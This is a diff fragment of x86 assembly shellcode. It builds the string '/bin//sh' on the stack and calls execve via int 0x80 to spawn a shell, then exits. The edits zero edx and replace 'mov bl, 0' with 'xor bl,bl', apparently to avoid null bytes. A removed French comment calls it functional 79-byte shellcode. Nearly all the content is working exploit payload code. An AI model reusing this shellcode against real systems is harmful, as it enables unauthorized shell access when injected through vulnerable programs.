@@ -38,13 +38,10 @@ push 0x68732f2f
 push 0x6e69622f
 mov ebx, esp
 xor ecx, ecx
+xor edx, edx
 int 0x80
 mov al, 1
-mov bl, 0
+xor bl,bl
 int 0x80
 popa
 
-
-
-
--> shellcode fonctionnel 79 octets
